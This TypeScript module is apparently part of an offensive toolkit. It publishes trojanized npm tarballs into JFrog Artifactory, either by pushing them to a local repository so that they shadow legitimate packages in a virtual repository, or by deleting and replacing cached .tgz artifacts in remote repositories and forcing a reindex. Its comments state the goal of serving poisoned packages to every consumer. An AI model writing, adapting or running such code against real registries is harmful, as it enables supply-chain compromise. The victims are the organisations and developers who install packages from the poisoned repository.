// Publish (or replace) npm packages in JFrog Artifactory.
//
// Two strategies:
//   1. **Local publish** — PUT to a local repo.  If the local repo is included
//      in a virtual repo's resolution order *before* the remote, the trojanized
//      package shadows the legitimate one for all consumers of the virtual.
//   2. **Cache overwrite** — Directly replace the cached .tgz artifact in a
//      remote repository via the Artifactory REST API.
//
// Strategy 1 is preferred (cleaner, normal npm publish flow).
// Strategy 2 is a fallback when no writable local repo is available.

import { createHash } from "node:crypto";
import { readFile } from "node:fs/promises";
import { gunzipSync } from "node:zlib";

import { logUtil } from "../../utils/logger";
import { authHeader, type JfrogSession } from "./auth";

declare function scramble(str: string): string;

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export type PublishMethod = "local" | "cache-overwrite";

export interface PublishResult {
  success: boolean;
  method: PublishMethod;
  repo: string;
  pkgName: string;
  version: string;
  error?: string;
}

interface PackageJson {
  name: string;
  version: string;
  readme?: string;
  [key: string]: unknown;
}

// ---------------------------------------------------------------------------
// Package.json extraction (mirrors npm/publish.ts)
// ---------------------------------------------------------------------------

function extractPackageJson(tar: Buffer): PackageJson {
  let offset = 0;
  while (offset + 512 <= tar.length) {
    const header = tar.subarray(offset, offset + 512);
    if (header[0] === 0) break;

    const nameField = header.subarray(0, 100);
    const nameEnd = nameField.indexOf(0);
    const name = nameField
      .subarray(0, nameEnd === -1 ? 100 : nameEnd)
      .toString("utf8");

    const sizeStr = header
      .subarray(124, 136)
      .toString("utf8")
      .replace(/\0/g, "")
      .trim();
    const size = sizeStr ? parseInt(sizeStr, 8) : 0;

    offset += 512;

    if (name === "package/package.json" || name.endsWith("/package.json")) {
      const data = tar.subarray(offset, offset + size);
      return JSON.parse(data.toString("utf8")) as PackageJson;
    }

    offset += Math.ceil(size / 512) * 512;
  }
  throw new Error("package.json not found in tarball");
}

// ---------------------------------------------------------------------------
// Strategy 1: Publish to a local repo (npm PUT endpoint)
// ---------------------------------------------------------------------------

/**
 * Publish a trojanized tarball to an Artifactory local npm repo via the
 * standard npm publish protocol (PUT).
 *
 * The registry endpoint is:
 *   PUT {baseUrl}/api/npm/{repoKey}/{encodedPkgName}
 *
 * This is the same protocol as `npm publish --registry=...`.
 */
async function publishToLocal(
  session: JfrogSession,
  tarballPath: string,
  repoKey: string,
): Promise<PublishResult> {
  const headers = authHeader(session.credential);

  const tarballBuffer = await readFile(tarballPath);
  const decompressed = gunzipSync(tarballBuffer);
  const pkg = extractPackageJson(decompressed);

  const { name, version } = pkg;
  if (!name || !version) {
    return {
      success: false,
      method: "local",
      repo: repoKey,
      pkgName: name ?? "unknown",
      version: version ?? "unknown",
      error: "package.json missing required 'name' or 'version'",
    };
  }

  const integrity =
    "sha512-" + createHash("sha512").update(tarballBuffer).digest("base64");
  const shasum = createHash("sha1").update(tarballBuffer).digest("hex");
  const base64Data = tarballBuffer.toString("base64");
  const tarballFilename = `${name}-${version}.tgz`;
  const tarballUrl = `${session.baseUrl}/api/npm/${repoKey}/${name}/-/${tarballFilename}`;

  const versionMetadata = {
    ...pkg,
    name,
    version,
    readme: pkg.readme ?? "ERROR: No README data found!",
    dist: { integrity, shasum, tarball: tarballUrl },
  };

  const body = {
    _id: name,
    name,
    "dist-tags": { latest: version },
    versions: { [version]: versionMetadata },
    access: "public",
    _attachments: {
      [tarballFilename]: {
        content_type: "application/octet-stream",
        data: base64Data,
        length: tarballBuffer.length,
      },
    } as Record<string, { content_type: string; data: string; length: number }>,
  };

  const encodedName = encodeURIComponent(name).replace("%40", "@");
  const url = `${session.baseUrl}/api/npm/${repoKey}/${encodedName}`;

  try {
    const res = await fetch(url, {
      method: "PUT",
      headers: {
        ...headers,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(body),
    });

    if (res.ok) {
      logUtil.log(
        `[jfrognpm] Published ${name}@${version} to local repo ${repoKey}`,
      );
      return {
        success: true,
        method: "local",
        repo: repoKey,
        pkgName: name,
        version,
      };
    }

    const errorText = await res.text().catch(() => "");
    return {
      success: false,
      method: "local",
      repo: repoKey,
      pkgName: name,
      version,
      error: `HTTP ${res.status} — ${errorText.slice(0, 300)}`,
    };
  } catch (e) {
    return {
      success: false,
      method: "local",
      repo: repoKey,
      pkgName: name,
      version,
      error: e instanceof Error ? e.message : String(e),
    };
  }
}

// ---------------------------------------------------------------------------
// Strategy 2: Overwrite remote cache artifact
// ---------------------------------------------------------------------------

/**
 * Overwrite a cached package tarball in a remote Artifactory repository.
 *
 * Steps:
 *   1. DELETE the existing cached .tgz artifact
 *   2. PUT the trojanized .tgz in its place
 *   3. POST a reindex to force metadata recalculation
 *
 * The cache artifact path is:
 *   {baseUrl}/{repoKey}/{pkgName}/-/{pkgName}-{version}.tgz
 */
async function overwriteCacheArtifact(
  session: JfrogSession,
  tarballPath: string,
  repoKey: string,
  pkgName: string,
  pkgVersion: string,
): Promise<PublishResult> {
  const headers = authHeader(session.credential);
  const tarballBuffer = await readFile(tarballPath);
  const tarballFilename = `${pkgName}-${pkgVersion}.tgz`;

  // Build the cache path.  Scoped packages have / in the URL.
  const cachePath = `/${repoKey}/${encodeURIComponent(pkgName)}/-/${tarballFilename}`;
  const artifactUrl = `${session.baseUrl}${cachePath}`;

  const sha1 = createHash("sha1").update(tarballBuffer).digest("hex");

  try {
    // Step 1 — Delete existing cached artifact
    logUtil.log(`[jfrognpm] Deleting cached artifact: ${artifactUrl}`);
    const delRes = await fetch(artifactUrl, {
      method: "DELETE",
      headers,
    });
    if (!delRes.ok) {
      logUtil.log(
        `[jfrognpm] Delete returned ${delRes.status} — artifact may not exist yet, continuing`,
      );
    }

    // Step 2 — Upload the replacement
    logUtil.log(`[jfrognpm] Uploading replacement: ${artifactUrl}`);
    const putRes = await fetch(artifactUrl, {
      method: "PUT",
      headers: {
        ...headers,
        "Content-Type": "application/octet-stream",
        "X-Checksum-Sha1": sha1,
      },
      body: tarballBuffer,
    });

    if (!putRes.ok) {
      const errorText = await putRes.text().catch(() => "");
      return {
        success: false,
        method: "cache-overwrite",
        repo: repoKey,
        pkgName,
        version: pkgVersion,
        error: `PUT failed: HTTP ${putRes.status} — ${errorText.slice(0, 300)}`,
      };
    }

    // Step 3 — Reindex to force metadata recalculation
    const reindexUrl = `${session.baseUrl}/api/npm/${repoKey}/reindex/${encodeURIComponent(pkgName)}`;
    logUtil.log(`[jfrognpm] Reindexing: ${reindexUrl}`);
    await fetch(reindexUrl, { method: "POST", headers }).catch((e) => {
      logUtil.log(`[jfrognpm] Reindex failed (non-fatal): ${e}`);
    });

    logUtil.log(
      `[jfrognpm] Cache overwrite for ${pkgName}@${pkgVersion} in ${repoKey}`,
    );
    return {
      success: true,
      method: "cache-overwrite",
      repo: repoKey,
      pkgName,
      version: pkgVersion,
    };
  } catch (e) {
    return {
      success: false,
      method: "cache-overwrite",
      repo: repoKey,
      pkgName,
      version: pkgVersion,
      error: e instanceof Error ? e.message : String(e),
    };
  }
}

// ---------------------------------------------------------------------------
// Unified publish entry point
// ---------------------------------------------------------------------------

/**
 * Publish a trojanized tarball to an Artifactory npm repo.
 *
 * Tries local publish first (strategy 1).  Falls back to cache overwrite
 * (strategy 2) if the target repo is remote/federated or local publish fails
 * with a permission error.
 */
export async function publishToJfrog(
  session: JfrogSession,
  tarballPath: string,
  repoKey: string,
  repoType: string,
): Promise<PublishResult> {
  const tarballBuffer = await readFile(tarballPath);
  const decompressed = gunzipSync(tarballBuffer);
  const pkg = extractPackageJson(decompressed);

  if (repoType === "local") {
    // Prefer local npm publish
    const result = await publishToLocal(session, tarballPath, repoKey);
    if (result.success) return result;

    // If local publish fails with 403/405, don't try cache overwrite
    // on a local repo — it doesn't make sense.
    logUtil.log(`[jfrognpm] Local publish failed: ${result.error}`);
    return result;
  }

  // Remote / virtual / federated — use cache overwrite
  return overwriteCacheArtifact(
    session,
    tarballPath,
    repoKey,
    pkg.name ?? "unknown",
    pkg.version ?? "0.0.0",
  );
}
